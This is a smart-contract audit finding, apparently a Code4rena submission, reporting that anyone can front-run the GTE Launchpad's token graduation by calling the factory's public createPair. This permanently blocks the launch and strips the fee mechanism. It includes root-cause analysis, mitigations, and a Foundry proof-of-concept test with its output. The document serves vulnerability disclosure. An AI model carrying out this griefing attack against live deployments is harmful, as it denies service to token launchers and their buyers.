  "body": "The token launch process is vulnerable to a front-running griefing attack that can permanently prevent any token from graduating, effectively bricking the core functionality of the Launchpad. An attacker can achieve this by observing the mempool and front-running the specific transaction that graduates a token, leading to a permanent Denial of Service (DoS) for that token's launch and a loss of trust in the platform.\n\nThe vulnerability stems from two interconnected root causes:\n\n1.  **Publicly Callable `createPair` Function:** The `GTELaunchpadV2PairFactory.sol` contract allows anyone to call the `createPair` function for any two tokens ([L29-L48](https://github.com/code-423n4/2025-08-gte-perps/blob/main/contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol#L29-L48)). Crucially, the factory's logic only enables the launchpad's fee-on-transfer mechanism if the `msg.sender` of this call is the `Launchpad` contract itself. If called by any other address, a standard, fee-less pair is created.\n\n2.  **Flawed Error Handling in `Launchpad.sol`:** When a token's bonding curve is fully sold, the final `buy` transaction triggers the `_createPairAndSwapRemaining` internal function. This function attempts to create the Uniswap V2 pair, but it wraps the `createPair` call in a `try/catch` block ([L483-L489](https://github.com/code-423n4/2025-08-gte-perps/blob/main/contracts/launchpad/Launchpad.sol#L483-L489)). The `catch` block is empty, meaning it incorrectly swallows the critical `PAIR_EXISTS` revert from the factory. Instead of handling the error gracefully, execution continues in a broken state. This ultimately causes the transaction to revert when the `uniV2Router.addLiquidity` call fails, as the `Launchpad` attempts to interact with a pair that was created prematurely and unexpectedly.\n\nAn attacker can exploit this by:\n1.  Monitoring the mempool for a `launchpad.buy()` transaction that will graduate a new token.\n2.  Submitting their own `factory.createPair()` transaction for the same token pair with a higher gas fee.\n3.  The attacker's transaction is mined first, creating a standard Uniswap pair without the GTE fee mechanism.\n4.  The legitimate `launchpad.buy()` transaction is then mined, but its internal call to `createPair` fails. The flawed `try/catch` block prevents the transaction from reverting immediately, but the logic cannot proceed correctly, causing the entire graduation transaction to revert.\n\n**Impact:** The consequences are severe for a protocol whose primary function is to launch tokens.\n\n*   **Permanent Denial of Service:** The legitimate `launchpad.buy()` transaction will now *always* fail for this token, as the pair already exists and the graduation logic cannot handle this state. The token can never graduate, its liquidity pool can never be seeded by the protocol, and its transfers can never be unlocked.\n*   **Permanent Disabling of the Rewards Mechanism:** By creating the pair without the launchpad as the originator, the attacker permanently prevents the GTE fee-on-transfer mechanism from being attached to that token's pair, irreparably breaking the economic model for that specific launch.\n*   **Loss of Trust and Platform Viability:** An attacker can perform this low-cost griefing attack on every single token launched, effectively holding the entire platform hostage and destroying its reputation and business model.\n\nThis constitutes a Medium severity finding as it is a critical disruption of protocol functionality and availability.\n\n#### Recommended mitigation steps\n\nThe vulnerability can be mitigated with a two-part, actionable solution:\n\n1.  **Restrict Pair Creation:** The `GTELaunchpadV2PairFactory.createPair` function should be modified to programmatically enforce that only the `Launchpad` contract can create pairs that involve a `LaunchToken`. This can be achieved with a modifier or a direct `require` statement. A robust implementation would be to add a check within `createPair`:\n    ```solidity\n    // In GTELaunchpadV2PairFactory.sol within createPair()\n    // A simple check to see if one of the tokens conforms to a LaunchToken interface\n    // This is a conceptual check; a specific interface or registry would be needed.\n    if (isLaunchToken(tokenA) || isLaunchToken(tokenB)) {\n        require(msg.sender == launchpad, \"Factory: LaunchToken pairs can only be created by the Launchpad\");\n    }\n    ```\n\n2.  **Improve Error Handling in Launchpad:** The `try/catch` block in `Launchpad.sol`'s `_createPairAndSwapRemaining` function should be removed entirely. The underlying `PAIR_EXISTS` revert from the factory is a critical failure condition that should not be silenced. Removing the `try/catch` will allow this revert to bubble up and fail the entire `buy` transaction immediately, providing a clear and atomic failure state. This prevents the contract from continuing execution in a broken state and provides a much clearer error reason to users and monitoring systems.",
  "proof_of_concept": "The following Proof of Concept demonstrates the front-running attack.\n1.  **Arrange:** A new token is created via the Launchpad. An attacker address is set up, and a buyer address is funded to purchase the entire bonding curve supply, which will trigger graduation.\n2.  **Act (Part 1 - Attacker):** The attacker, simulating a front-running transaction, directly calls `createPair` on the Uniswap V2 Factory for the new token and the quote token. This transaction succeeds.\n3.  **Act (Part 2 - Buyer) & Assert:** The legitimate buyer's `buy` transaction is then simulated. The PoC asserts that this transaction **reverts**, proving that the attacker's front-running action has successfully caused the token graduation to fail.\n\n#### PoC Code\n\n```solidity\n// test/c4-poc/PoCLaunchpad.t.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IUniswapV2Factory} from \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport \"forge-std/console.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    function test_submissionValidity() external {\n        console.log(\"--- PoC: H-03: Factory Front-Running Causes Graduation Transaction to Fail ---\");\n\n        // --- ARRANGE ---\n        console.log(\"\\nPHASE 1: Setting up the scenario...\");\n\n        // 1. A legitimate developer launches a new token.\n        address newToken = _launchToken();\n        console.log(\" > A new token has been launched:\", newToken);\n\n        // 2. An attacker monitors the mempool.\n        address attacker = makeAddr(\"attacker\");\n        console.log(\" > Attacker address:\", attacker);\n\n        // 3. A legitimate buyer prepares to graduate the token.\n        address buyer = makeAddr(\"buyer\");\n        uint256 bondingSupply = curve.bondingSupply(newToken);\n        uint256 quoteCost = curve.quoteQuoteForBase(newToken, bondingSupply, true);\n        quoteToken.mint(buyer, quoteCost);\n        console.log(\" > Legitimate buyer prepares to graduate the token by buying the full supply.\");\n\n        // --- ACT (PART 1) ---\n        console.log(\"\\nPHASE 2: Attacker front-runs the graduation transaction...\");\n\n        // The attacker sees the legitimate `buy` transaction and front-runs it by calling `createPair` first.\n        IUniswapV2Factory factoryContract = IUniswapV2Factory(uniV2Router.factory());\n\n        vm.prank(attacker);\n        factoryContract.createPair(newToken, address(quoteToken));\n        console.log(\" > Attacker successfully calls `createPair` first.\");\n\n        // --- ACT & ASSERT ---\n        console.log(\"\\nPHASE 3: Verifying the legitimate graduation transaction fails...\");\n\n        vm.startPrank(buyer);\n        quoteToken.approve(address(launchpad), quoteCost);\n\n        // We now expect the legitimate `buy` call to revert. The `try/catch` block in the Launchpad\n        // swallows the initial \"PAIR_EXISTS\" error, but the execution continues in a broken\n        // state and reverts later for an unknown reason. By catching any revert, we prove the\n        // transaction is non-functional.\n        vm.expectRevert();\n        launchpad.buy(\n            ILaunchpad.BuyData({\n                account: buyer, token: newToken, recipient: buyer,\n                amountOutBase: bondingSupply, maxAmountInQuote: quoteCost\n            })\n        );\n        vm.stopPrank();\n\n        console.log(\" > SUCCESS: The legitimate graduation `buy` transaction reverted as expected.\");\n        console.log(\"\\n--- PoC COMPLETE: The front-running attack successfully caused the legitimate graduation to fail. ---\");\n    }\n}\n```\n\n#### Reproduction Steps\n\n1.  Save the code above as `test/c4-poc/PoCLaunchpad.t.sol`.\n2.  Run the test with the command: `forge test --match-test test_submissionValidity -vvv`\n3.  The test will pass, and the console logs will narrate each step of the successful attack, culminating in the proof that the legitimate graduation transaction reverted as expected.\n\n#### Expected Results\n\n```solidity\n[⠊] Compiling...\n[⠆] Compiling 1 files with Solc 0.8.27\n[⠰] Solc 0.8.27 finished in 2.18s\nCompiler run successful with warnings:\nWarning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.\n   --> contracts/clob/types/Book.sol:179:31:\n    |\n179 |     function isMaxLimitExempt(Book storage self, address factory, address who) internal returns (bool allowed) {\n    |                               ^^^^^^^^^^^^^^^^^\n\nWarning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.\n   --> contracts/launchpad/Launchpad.sol:156:9:\n    |\n156 |         address clobFactory_,\n    |         ^^^^^^^^^^^^^^^^^^^^\n\n\nRan 1 test for test/c4-poc/PoCPerps.t.sol:PoCPerps\n[PASS] test_submissionValidity() (gas: 208)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 22.33ms (188.67µs CPU time)\n\nRan 1 test for test/c4-poc/PoCLaunchpad.t.sol:PoCLaunchpad\n[PASS] test_submissionValidity() (gas: 4095369)\nLogs:\n  --- PoC: H-03: Factory Front-Running Causes Graduation Transaction to Fail ---\n\nPHASE 1: Setting up the scenario...\n   > A new token has been launched: 0x4f49438639052E58CA9B25f3a09e1016ef868E98\n   > Attacker address: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e\n   > Legitimate buyer prepares to graduate the token by buying the full supply.\n\nPHASE 2: Attacker front-runs the graduation transaction...\n   > Attacker successfully calls `createPair` first.\n\nPHASE 3: Verifying the legitimate graduation transaction fails...\n   > SUCCESS: The legitimate graduation `buy` transaction reverted as expected.\n\n--- PoC COMPLETE: The front-running attack successfully caused the legitimate graduation to fail. ---\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.48ms (3.58ms CPU time)\n\nRan 2 test suites in 102.06ms (45.81ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```",
